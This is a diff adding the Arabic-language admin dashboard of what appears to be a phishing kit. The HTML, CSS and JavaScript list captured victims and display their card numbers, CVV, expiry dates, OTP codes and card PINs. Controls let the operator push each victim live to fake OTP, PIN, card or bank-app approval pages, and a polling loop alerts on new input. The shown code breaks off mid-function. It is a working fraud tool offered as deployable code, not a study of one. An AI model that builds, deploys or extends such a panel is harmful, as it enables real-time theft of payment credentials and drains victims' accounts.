@@ -1,0 +1,1082 @@
+
+
+
+      <script>
+      window.location.href="login.php";
+      </script>
+      <!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="utf-8">
+    <title>لوحة التحكم</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <link href="img/favicon.ico" rel="icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: #f0f2f5;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* === Top Navbar === */
+        .top-nav {
+            background: #fff;
+            color: #2d3748;
+            padding: 0 20px;
+            height: 54px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-shrink: 0;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .top-nav .brand {
+            display: none;
+        }
+        .top-nav .nav-stats {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            font-size: 13px;
+            color: #64748b;
+        }
+        .top-nav .nav-stats .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .top-nav .nav-stats .stat-item .stat-num {
+            background: #e2e8f0;
+            color: #2d3748;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-weight: 700;
+        }
+        .top-nav .nav-stats .stat-item .stat-num.online-num {
+            background: #dcfce7;
+            color: #16a34a;
+        }
+        .top-nav .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .top-nav .nav-actions a, .top-nav .nav-actions button {
+            color: #64748b;
+            text-decoration: none;
+            font-size: 13px;
+            background: none;
+            border: 1px solid #e2e8f0;
+            padding: 5px 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: 'Tajawal', sans-serif;
+            transition: all 0.2s;
+            font-weight: 600;
+        }
+        .top-nav .nav-actions a:hover, .top-nav .nav-actions button:hover {
+            background: #f1f5f9;
+            color: #2d3748;
+        }
+        .btn-delete-all-nav {
+            color: #ef4444 !important;
+            border-color: #fecaca !important;
+        }
+        .btn-delete-all-nav:hover {
+            background: #fef2f2 !important;
+            color: #dc2626 !important;
+        }
+
+        /* === Main Layout === */
+        .main-layout {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+
+        /* === Mail List (Right Panel) === */
+        .mail-list-panel {
+            width: 370px;
+            min-width: 300px;
+            background: #fff;
+            border-left: 1px solid #e2e8f0;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .mail-list-header {
+            padding: 14px 16px;
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #fff;
+        }
+        .mail-list-header h6 {
+            margin: 0;
+            font-weight: 700;
+            color: #2d3748;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .mail-list-header h6 i {
+            color: #64748b;
+        }
+        .mail-list-header .inbox-count {
+            background: #2d3748;
+            color: #fff;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        /* === Search Box === */
+        .search-box {
+            padding: 10px 16px;
+            border-bottom: 1px solid #e2e8f0;
+            background: #fafbfc;
+        }
+        .search-box .search-input-wrap {
+            position: relative;
+        }
+        .search-box .search-input-wrap i {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+            font-size: 13px;
+        }
+        .search-box input {
+            width: 100%;
+            padding: 8px 36px 8px 12px;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            font-family: 'Tajawal', sans-serif;
+            font-size: 13px;
+            outline: none;
+            background: #fff;
+            transition: border-color 0.2s;
+        }
+        .search-box input:focus {
+            border-color: #94a3b8;
+        }
+        .search-box input::placeholder {
+            color: #94a3b8;
+        }
+
+        .mail-list-scroll {
+            flex: 1;
+            overflow-y: auto;
+        }
+        .mail-list-scroll::-webkit-scrollbar { width: 5px; }
+        .mail-list-scroll::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
+
+        /* === Mail Item Row === */
+        .mail-row {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid #f1f5f9;
+            cursor: pointer;
+            transition: all 0.15s;
+            position: relative;
+        }
+        .mail-row:hover {
+            background: #f8fafc;
+        }
+        .mail-row.active {
+            background: #f1f5f9;
+            border-right: 3px solid #2d3748;
+        }
+        .mail-row.unread {
+            background: #f8fafc;
+        }
+        .mail-row.unread .row-name {
+            font-weight: 800;
+        }
+        .mail-row .row-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #2d3748, #4a5568);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            margin-left: 12px;
+            flex-shrink: 0;
+            position: relative;
+        }
+        .mail-row .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #cbd5e1;
+            border: 2px solid #fff;
+            position: absolute;
+            bottom: 0;
+            left: 0;
+        }
+        .mail-row .status-dot.online {
+            background: #22c55e;
+        }
+        .mail-row .row-info {
+            flex: 1;
+            min-width: 0;
+            overflow: hidden;
+        }
+        .mail-row .row-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e293b;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .mail-row .row-preview {
+            font-size: 12px;
+            color: #94a3b8;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            margin-top: 2px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .mail-row .row-preview .msg-badge {
+            background: #f1f5f9;
+            color: #475569;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .mail-row .row-preview .price-badge {
+            background: #fef3c7;
+            color: #b45309;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+        }
+        .mail-row .row-preview .address-badge {
+            background: #ede9fe;
+            color: #6d28d9;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .mail-row .row-time {
+            font-size: 11px;
+            color: #94a3b8;
+            white-space: nowrap;
+            margin-right: 8px;
+            flex-shrink: 0;
+        }
+        .mail-row .row-delete {
+            opacity: 0;
+            transition: opacity 0.2s;
+            background: none;
+            border: none;
+            color: #ef4444;
+            cursor: pointer;
+            font-size: 13px;
+            padding: 4px;
+            margin-right: 4px;
+            flex-shrink: 0;
+        }
+        .mail-row:hover .row-delete {
+            opacity: 1;
+        }
+
+        /* === Detail Panel (Left) === */
+        .detail-panel {
+            flex: 1;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .detail-empty {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #cbd5e1;
+        }
+        .detail-empty i {
+            font-size: 64px;
+            margin-bottom: 16px;
+            color: #e2e8f0;
+        }
+        .detail-empty p {
+            font-size: 16px;
+            color: #94a3b8;
+        }
+
+        /* === Detail Header === */
+        .detail-header {
+            padding: 16px 24px;
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #fafbfc;
+        }
+        .detail-header .user-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .detail-header .user-title .detail-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #2d3748, #4a5568);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 20px;
+        }
+        .detail-header .user-title .detail-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1e293b;
+        }
+        .detail-header .user-title .detail-phone {
+            font-size: 13px;
+            color: #94a3b8;
+        }
+        .detail-header .detail-actions {
+            display: flex;
+            gap: 8px;
+        }
+        .detail-header .detail-actions button {
+            padding: 6px 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Tajawal', sans-serif;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .btn-act-card {
+            background: #f1f5f9;
+            color: #475569;
+        }
+        .btn-act-card:hover { background: #2d3748; color: #fff; }
+        .btn-act-redirect {
+            background: #fef3c7;
+            color: #b45309;
+        }
+        .btn-act-redirect:hover { background: #d97706; color: #fff; }
+        .btn-act-delete {
+            background: #fef2f2;
+            color: #ef4444;
+        }
+        .btn-act-delete:hover { background: #ef4444; color: #fff; }
+
+        /* === Detail Body === */
+        .detail-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 24px;
+            background: #f8fafc;
+        }
+        .detail-body::-webkit-scrollbar { width: 5px; }
+        .detail-body::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
+
+        .info-section {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #e2e8f0;
+        }
+        .info-section h6 {
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 14px;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .info-section h6 i {
+            color: #64748b;
+        }
+        .info-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .info-table tr { border-bottom: 1px solid #f1f5f9; }
+        .info-table tr:last-child { border-bottom: none; }
+        .info-table th {
+            padding: 10px 12px;
+            font-weight: 600;
+            color: #64748b;
+            font-size: 13px;
+            width: 140px;
+            text-align: right;
+            vertical-align: top;
+        }
+        .info-table td {
+            padding: 10px 12px;
+            color: #1e293b;
+            font-size: 14px;
+        }
+
+        /* === Action Buttons in Detail === */
+        .action-section {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #e2e8f0;
+        }
+        .action-section h6 {
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 14px;
+            font-size: 15px;
+        }
+        .action-section h6 i {
+            color: #64748b;
+        }
+        .action-btns {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .action-btns button {
+            flex: 1;
+            min-width: 120px;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            font-family: 'Tajawal', sans-serif;
+            transition: all 0.2s;
+        }
+        .btn-accept { background: linear-gradient(135deg, #2d3748, #4a5568); color: #fff; }
+        .btn-accept:hover { opacity: 0.9; }
+        .btn-reject { background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; }
+        .btn-reject:hover { opacity: 0.9; }
+        .btn-otp { background: linear-gradient(135deg, #2d3748, #4a5568); color: #fff; }
+        .btn-otp:hover { opacity: 0.9; }
+        .btn-payment { background: linear-gradient(135deg, #1e293b, #334155); color: #fbbf24; }
+        .btn-payment:hover { opacity: 0.9; }
+
+        .msg-badge {
+            background: #f1f5f9;
+            color: #475569;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        /* === Responsive === */
+        @media (max-width: 768px) {
+            .mail-list-panel { width: 100%; }
+            .detail-panel { display: none; }
+            .detail-panel.show-mobile { display: flex; position: fixed; top: 54px; left: 0; right: 0; bottom: 0; z-index: 100; }
+            .back-btn-mobile { display: block !important; }
+        }
+        .back-btn-mobile { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navbar -->
+    <div class="top-nav">
+        <div class="nav-stats">
+            <div class="stat-item">
+                <i class="fas fa-inbox"></i>
+                <span>الوارد</span>
+                <span class="stat-num" id="inboxCount">1</span>
+            </div>
+            <div class="stat-item">
+                <i class="fas fa-wifi"></i>
+                <span>متصل</span>
+                <span class="stat-num online-num" id="onlineCount">0</span>
+            </div>
+            <div class="stat-item">
+                <i class="fas fa-chart-bar"></i>
+                <span>الزيارات</span>
+                <span class="stat-num" id="totalVisits">0</span>
+            </div>
+        </div>
+        <div class="nav-actions">
+            <form action="" method="POST" style="margin:0;display:inline;">
+                <button type="submit" name="deleteAllUser" class="btn-delete-all-nav">
+                    <i class="fas fa-trash-alt"></i> حذف الكل
+                </button>
+            </form>
+            <a href="logout.php"><i class="fas fa-sign-out-alt"></i> خروج</a>
+        </div>
+    </div>
+
+    <!-- Main Layout -->
+    <div class="main-layout">
+        <!-- Right: Mail List -->
+        <div class="mail-list-panel">
+            <div class="mail-list-header">
+                <h6><i class="fas fa-inbox"></i> صندوق الوارد</h6>
+                <span class="inbox-count" id="inboxCount2">1</span>
+            </div>
+            <!-- Search Box -->
+            <div class="search-box">
+                <div class="search-input-wrap">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="searchInput" placeholder="بحث عن عميل..." oninput="filterUsers()">
+                </div>
+            </div>
+            <div class="mail-list-scroll" id="result">
+                                    <div class="mail-row unread" data-user-id="1" data-username="soud ajlan" id="mailRow1" onclick="selectUser(1, this)">
+                        <div class="row-avatar">
+                            s                            <div class="status-dot" id="status1"></div>
+                        </div>
+                        <div class="row-info">
+                            <div class="row-name" id="name1">soud ajlan</div>
+                            <div class="row-preview">
+                                <span id="message1">معلومات مقدم الطلب</span>
+                                <span class="msg-badge" id="page1">الرمز السري</span>
+                                                                <span class="address-badge" id="addr1">1132222222555555555555554</span>
+                                                            </div>
+                        </div>
+                        <div class="row-time">12:28</div>
+                        <form action="" method="POST" style="margin:0;" onclick="event.stopPropagation();">
+                            <button type="submit" name="deleteUser" class="row-delete" title="حذف"><i class="fas fa-trash"></i></button>
+                            <input type="hidden" name="userId" value="1">
+                        </form>
+                    </div>
+                            </div>
+        </div>
+
+        <!-- Left: Detail Panel -->
+        <div class="detail-panel" id="detailPanel">
+            <div class="detail-empty" id="detailEmpty">
+                <i class="fas fa-envelope-open-text"></i>
+                <p>اختر عميل من القائمة لعرض التفاصيل</p>
+            </div>
+            <div id="detailContent" style="display:none;flex-direction:column;flex:1;overflow:hidden;">
+                <!-- Detail Header -->
+                <div class="detail-header">
+                    <div class="user-title">
+                        <button class="back-btn-mobile btn btn-sm btn-outline-secondary" onclick="closeDetail()" style="margin-left:8px;"><i class="fas fa-arrow-right"></i></button>
+                        <div class="detail-avatar" id="detailAvatar">?</div>
+                        <div>
+                            <div class="detail-name" id="detailName">-</div>
+                            <div class="detail-phone" id="detailPhone">-</div>
+                        </div>
+                    </div>
+                    <div class="detail-actions">
+                        <button class="btn-act-card" id="btnCard" onclick="showCardInfo()"><i class="fas fa-credit-card"></i> البطاقة</button>
+                        <button class="btn-act-redirect" id="btnRedirect" onclick="showRedirectPanel()"><i class="fas fa-directions"></i> توجيه</button>
+                        <form action="" method="POST" style="margin:0;display:inline;" id="deleteForm">
+                            <button type="submit" name="deleteUser" class="btn-act-delete"><i class="fas fa-trash"></i> حذف</button>
+                            <input type="hidden" name="userId" id="deleteUserId" value="">
+                        </form>
+                    </div>
+                </div>
+                <!-- Detail Body -->
+                <div class="detail-body" id="detailBody">
+                    <!-- Filled by JS -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+    var selectedUserId = null;
+
+    // === Search / Filter ===
+    function filterUsers() {
+        var query = document.getElementById('searchInput').value.trim().toLowerCase();
+        var rows = document.querySelectorAll('.mail-row[data-user-id]');
+        rows.forEach(function(row) {
+            var name = (row.getAttribute('data-username') || '').toLowerCase();
+            var nameEl = row.querySelector('.row-name');
+            var nameText = nameEl ? nameEl.textContent.toLowerCase() : '';
+            if (name.indexOf(query) !== -1 || nameText.indexOf(query) !== -1) {
+                row.style.display = '';
+            } else {
+                row.style.display = 'none';
+            }
+        });
+    }
+
+    function selectUser(userId, el) {
+        // Mark as read
+        el.classList.remove('unread');
+
+        // Remove active from all
+        document.querySelectorAll('.mail-row').forEach(function(r) { r.classList.remove('active'); });
+        el.classList.add('active');
+
+        selectedUserId = userId;
+        document.getElementById('deleteUserId').value = userId;
+
+        // Show detail panel
+        document.getElementById('detailEmpty').style.display = 'none';
+        var dc = document.getElementById('detailContent');
+        dc.style.display = 'flex';
+
+        // Mobile
+        document.getElementById('detailPanel').classList.add('show-mobile');
+
+        // Load user info
+        loadUserDetail(userId);
+    }
+
+    function closeDetail() {
+        document.getElementById('detailPanel').classList.remove('show-mobile');
+        document.getElementById('detailEmpty').style.display = 'flex';
+        document.getElementById('detailContent').style.display = 'none';
+        document.querySelectorAll('.mail-row').forEach(function(r) { r.classList.remove('active'); });
+        selectedUserId = null;
+    }
+
+    function loadUserDetail(userId) {
+        var body = document.getElementById('detailBody');
+        body.innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8;"><i class="fas fa-spinner fa-spin" style="font-size:30px;"></i><p style="margin-top:10px;">جاري التحميل...</p></div>';
+
+        // Load user info
+        fetch('user-info.php?id=' + userId)
+            .then(function(r) { return r.json(); })
+            .then(function(user) {
+                if (user.error) {
+                    body.innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8;"><p>لا توجد بيانات</p></div>';
+                    return;
+                }
+
+                var initial = (user.username || '?').charAt(0);
+                document.getElementById('detailAvatar').textContent = initial;
+                document.getElementById('detailName').textContent = user.username || '-';
+                document.getElementById('detailPhone').textContent = user.phone || '-';
+
+                var html = '';
+
+                // Personal Info Section
+                html += '<div class="info-section">';
+                html += '<h6><i class="fas fa-user"></i> البيانات الشخصية</h6>';
+                html += '<table class="info-table">';
+                html += '<tr><th>الاسم</th><td>' + (user.username || '-') + '</td></tr>';
+                html += '<tr><th>رقم الهاتف</th><td style="direction:ltr;text-align:right;">' + (user.phone || '-') + '</td></tr>';
+                html += '<tr><th>العنوان</th><td>' + (user.address || '-') + '</td></tr>';
+                html += '<tr><th>الحالة</th><td><span class="msg-badge">' + (user.message || '-') + '</span></td></tr>';
+                html += '<tr><th>الصفحة الحالية</th><td>' + (user.page || '-') + '</td></tr>';
+                html += '<tr><th>تاريخ التسجيل</th><td>' + (user.created_at || '-') + '</td></tr>';
+                html += '</table></div>';
+
+                // Card Info Section (loaded separately)
+                html += '<div class="info-section" id="cardSection">';
+                html += '<h6><i class="fas fa-credit-card"></i> بيانات البطاقة</h6>';
+                html += '<div id="cardInfoContent"><div style="text-align:center;color:#94a3b8;padding:10px;"><i class="fas fa-spinner fa-spin"></i> جاري التحميل...</div></div>';
+                html += '</div>';
+
+                // Card Actions
+                html += '<div class="action-section">';
+                html += '<h6><i class="fas fa-check-circle"></i> إجراءات البطاقة</h6>';
+                html += '<div style="margin-bottom:12px;">';
+                html += '<select class="form-select" id="selUrl' + userId + '" style="margin-bottom:10px;">';
+                html += '<option value="otp.php" selected>OTP</option>';
+                html += '<option value="s.php">الموافقة من التطبيق البنكي</option>';
+                html += '<option value="payment.php">البطاقة</option>';
+                html += '<option value="payment2.php">طلب بطاقة جديدة</option>';
+                html += '</select>';
+                html += '</div>';
+                html += '<div class="action-btns">';
+                html += '<button class="btn-accept" onclick="callRequest(' + userId + ', 1, ' + userId + ')"><i class="fas fa-check"></i> قبول</button>';
+                html += '<button class="btn-reject" onclick="callRequest(' + userId + ', 2, ' + userId + ')"><i class="fas fa-times"></i> رفض</button>';
+                html += '</div></div>';
+
+                // Redirect Section
+                html += '<div class="action-section" id="redirectSection">';
+                html += '<h6><i class="fas fa-directions"></i> إعادة التوجيه</h6>';
+                html += '<select class="form-select" id="selaaUrl' + userId + '" style="margin-bottom:10px;">';
+                html += '<option value="index.php" selected>صفحة معلومات التسجيل</option>';
+                html += '<option value="payment.php">صفحة البطاقة</option>';
+                html += '<option value="otp.php">رمز OTP</option>';
+                html += '<option value="password.php">رمز سري</option>';
+                html += '<option value="payment2.php">طلب بطاقة جديدة</option>';
+                html += '<option value="s.php">الموافقة من التطبيق البنكي</option>';
+                html += '</select>';
+                html += '<div class="action-btns">';
+                html += '<button class="btn-otp" onclick="callaaRequest(' + userId + ')"><i class="fas fa-paper-plane"></i> توجيه</button>';
+                html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'otp.php\')"><i class="fas fa-key"></i> OTP</button>';
+                html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'payment.php\')"><i class="fas fa-credit-card"></i> البطاقة</button>';
+                html += '</div></div>';
+
+                body.innerHTML = html;
+
+                // Load card info
+                loadCardInfo(userId);
+            })
+            .catch(function(err) {
+                body.innerHTML = '<div style="text-align:center;padding:40px;color:#ef4444;"><p>خطأ في تحميل البيانات</p></div>';
+            });
+    }
+
+    function loadCardInfo(userId) {
+        fetch('card-id.php?id=' + userId)
+            .then(function(r) { return r.json(); })
+            .then(function(cards) {
+                var container = document.getElementById('cardInfoContent');
+                if (!container) return;
+                if (!cards || cards.length === 0) {
+                    container.innerHTML = '<div style="text-align:center;color:#94a3b8;padding:10px;"><i class="fas fa-credit-card" style="font-size:24px;color:#e2e8f0;"></i><p style="margin-top:6px;">لا توجد بيانات بطاقة</p></div>';
+                } else {
+                    var html = '<div style="margin-bottom:8px;text-align:center;"><span style="background:#e8f5e9;color:#2c7a2c;padding:4px 14px;border-radius:20px;font-size:12px;font-weight:700;">إجمالي البطاقات: ' + cards.length + '</span></div>';
+                    for (var i = cards.length - 1; i >= 0; i--) {
+                        var card = cards[i];
+                        var isLatest = (i === cards.length - 1);
+                        var borderColor = isLatest ? '#22c55e' : '#e5e7eb';
+                        var label = isLatest ? '<span style="background:#dcfce7;color:#16a34a;padding:2px 10px;border-radius:12px;font-size:11px;font-weight:700;">الأحدث</span>' : '<span style="background:#f1f5f9;color:#64748b;padding:2px 10px;border-radius:12px;font-size:11px;">بطاقة ' + (i + 1) + '</span>';
+                        html += '<div style="border:2px solid ' + borderColor + ';border-radius:12px;padding:12px;margin-bottom:10px;">';
+                        html += '<div style="text-align:center;margin-bottom:8px;">' + label + '</div>';
+                        html += '<table class="info-table" style="margin-bottom:0;">';
+                        html += '<tr><th>رقم البطاقة</th><td style="direction:ltr;text-align:right;font-weight:700;letter-spacing:2px;">' + (card.cardNumber || '-') + '</td></tr>';
+                        html += '<tr><th>الاسم على البطاقة</th><td>' + (card.cardName || '-') + '</td></tr>';
+                        html += '<tr><th>تاريخ الانتهاء</th><td style="direction:ltr;text-align:right;">' + (card.year || '-') + '</td></tr>';
+                        html += '<tr><th>CVV</th><td style="direction:ltr;text-align:right;font-weight:700;">' + (card.cvv || '-') + '</td></tr>';
+                        if (card.otp) {
+                            html += '<tr style="background:#fef3c7;"><th style="color:#b45309;font-weight:700;"><i class="fas fa-key" style="margin-left:4px;"></i> رمز OTP</th><td style="direction:ltr;text-align:right;font-weight:700;font-size:18px;color:#b45309;">' + card.otp + '</td></tr>';
+                        }
+                        if (card.password) {
+                            html += '<tr style="background:#dbeafe;"><th style="color:#1d4ed8;font-weight:700;"><i class="fas fa-lock" style="margin-left:4px;"></i> الرمز السري</th><td style="direction:ltr;text-align:right;font-weight:700;font-size:18px;color:#1d4ed8;">' + card.password + '</td></tr>';
+                        }
+                        if (card.created_at) {
+                            html += '<tr><th>تاريخ الإنشاء</th><td style="font-size:11px;color:#94a3b8;">' + card.created_at + '</td></tr>';
+                        }
+                        html += '</table></div>';
+                    }
+                    container.innerHTML = html;
+                }
+            })
+            .catch(function() {
+                var container = document.getElementById('cardInfoContent');
+                if (container) container.innerHTML = '<p style="color:#94a3b8;text-align:center;">تعذر تحميل بيانات البطاقة</p>';
+            });
+    }
+
+    function showCardInfo() {
+        if (!selectedUserId) return;
+        var el = document.getElementById('cardSection');
+        if (el) el.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function showRedirectPanel() {
+        if (!selectedUserId) return;
+        var el = document.getElementById('redirectSection');
+        if (el) el.scrollIntoView({ behavior: 'smooth' });
+    }
+    </script>
+
+    <script>
+        function callRequest(id, status, userId) {
+            var selectElement = document.getElementById('selUrl' + id);
+            var selectedValue = selectElement.value;
+            if (status == 2) {
+                selectedValue += '?reject=1';
+            }
+            $.ajax({
+                url: 'action-code.php',
+                type: 'GET',
+                data: {
+                    user_id: id,
+                    status: status,
+                    url: selectedValue
+                },
+                success: function(response) {
+                    $.ajax({
+                        url: 'trigger-page.php',
+                        method: 'POST',
+                        data: {
+                            userId: userId,
+                            page: selectedValue
+                        },
+                        success: function() {
+                            // Reload card info
+                            loadCardInfo(userId);
+                        }
+                    });
+                },
+                error: function(xhr, status, error) {
+                    console.error('Request failed:', status, error);
+                }
+            });
+        }
+
+        function callTRequest(id, status, userId) {
+            var selectElement = document.getElementById('selTUrl' + id);
+            var codeNafath = document.getElementById('codeNafath' + id);
+
+            var selectedValue = selectElement.value;
+            var codeNafathValue = codeNafath.value;
+
+            if (status == 2) {
+                selectedValue += '?reject=1';
+            }
+
+            if (selectedValue == "StepFifth.php") {
+                selectedValue += '?code=' + codeNafathValue;
+            }
+
+            $.ajax({
+                url: 'action-code-nafath.php',
+                type: 'GET',
+                data: {
+                    user_id: id,
+                    status: status,
+                    url: selectedValue
+                },
+                success: function(response) {},
+                error: function(xhr, status, error) {
+                    console.error('Request failed:', status, error);
+                }
+            });
+        }
+
+        function redirectUser(userId, page) {
+            $.ajax({
+                url: 'trigger-page.php',
+                method: 'POST',
+                data: {
+                    userId: userId,
+                    page: page,
+                },
+                success: function(response) {},
+                error: function(xhr, status, error) {
+                    console.error('Request failed:', status, error);
+                }
+            });
+        }
+
+        function callaaRequest(userId) {
+            var selectElement = document.getElementById('selaaUrl' + userId);
+            var selectedValue = selectElement.value;
+
+            $.ajax({
+                url: 'trigger-page.php',
+                method: 'POST',
+                data: {
+                    userId: userId,
+                    page: selectedValue,
+                },
+                success: function(response) {},
+                error: function(xhr, status, error) {}
+            });
+        }
+    </script>
+
+<script>
+var lastUsersData = '';
+var knownUserIds = [];
+var lastInputAt = {};
+var isPolling = false;
+
+document.querySelectorAll('.mail-row[data-user-id]').forEach(function(item) {
+    var uid = parseInt(item.getAttribute('data-user-id'));
+    knownUserIds.push(uid);
+    lastInputAt[uid] = '';
+});
+
+function buildUserRow(user) {
+    var uid = user.id;
+    var initial = (user.username || '?').charAt(0);
+    return '<div class="mail-row unread" data-user-id="' + uid + '" data-username="' + (user.username || '').replace(/"/g, '&quot;') + '" id="mailRow' + uid + '" onclick="selectUser(' + uid + ', this)">' +
+        '<div class="row-avatar">' + initial +
+            '<div class="status-dot" id="status' + uid + '"></div>' +
+        '</div>' +
+        '<div class="row-info">' +
+            '<div class="row-name" id="name' + uid + '">' + (user.username || '') + '</div>' +
+            '<div class="row-preview">' +
+                '<span id="message' + uid + '">' + (user.message || '') + '</span> ' +
+                '<span class="msg-badge" id="page' + uid + '">' + (user.page || '') + '</span>' +
+                (user.address ? '<span class="address-badge" id="addr' + uid + '">' + user.address + '</span>' : '<span class="address-badge" id="addr' + uid + '" style="display:none;"></span>') +
+            '</div>' +
+        '</div>' +
+        '<div class="row-time">' + (user.created_at || '').substring(11, 16) + '</div>' +
+        '<form action="" method="POST" style="margin:0;" onclick="event.stopPropagation();">' +
+            '<button type="submit" name="deleteUser" class="row-delete" title="حذف"><i class="fas fa-trash"></i></button>' +
+            '<input type="hidden" name="userId" value="' + uid + '">' +
+        '</form>' +
+    '</div>';
+}
+
+function startDashboardPolling() {
+    if (isPolling) return;
+    isPolling = true;
+
+    fetch('polling-dashboard.php')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            var newData = JSON.stringify(data);
+
+            if (newData === lastUsersData) {
+                isPolling = false;
+                return;
+            }
+
+            var isFirstLoad = (lastUsersData === '');
+            lastUsersData = newData;
+
+            var container = document.getElementById('result');
+            var serverIds = data.map(function(u) { return u.id; });
+            var playSound = false;
+
+            data.forEach(function(user) {
+                if (knownUserIds.indexOf(user.id) === -1) {
+                    container.insertAdjacentHTML('afterbegin', buildUserRow(user));
+                    knownUserIds.push(user.id);
+                    lastInputAt[user.id] = (user.last_input_at || '').trim();
+                    if (!isFirstLoad) {
+                        playSound = true;
+                    }
+                }
+            });
+
+            data.forEach(function(user) {
+                var uid = user.id;
+                var msgEl = document.getElementById('message' + uid);
+                var pageEl = document.getElementById('page' + uid);
+                var nameEl = document.getElementById('name' + uid);
+                var userItem = document.getElementById('mailRow' + uid);
+
+                var currentMsg = (user.message || '').trim();
+                var currentInputAt = (user.last_input_at || '').trim();
+                var prevInputAt = lastInputAt[uid] || '';
+
+                var isNewInput = (prevInputAt !== '' && currentInputAt !== '' && currentInputAt !== prevInputAt);
+
+                if (msgEl && msgEl.textContent.trim() !== currentMsg) {
+                    msgEl.textContent = user.message || '';
+                }
+
+                if (isNewInput && !isFirstLoad) {
+                    playSound = true;
+                    if (userItem) {
+                        container.insertBefore(userItem, container.firstChild);
+                    }
+                    if (userItem) {
+                        userItem.classList.add('unread');
+                    }
+                    // Refresh detail if this user is selected
+                    if (selectedUserId === uid) {
+                        loadUserDetail(uid);
+                    }
+                }
+
+                lastInputAt[uid] = currentInputAt;
+
+                if (pageEl && pageEl.textContent.trim() !== (user.page || '').trim()) {
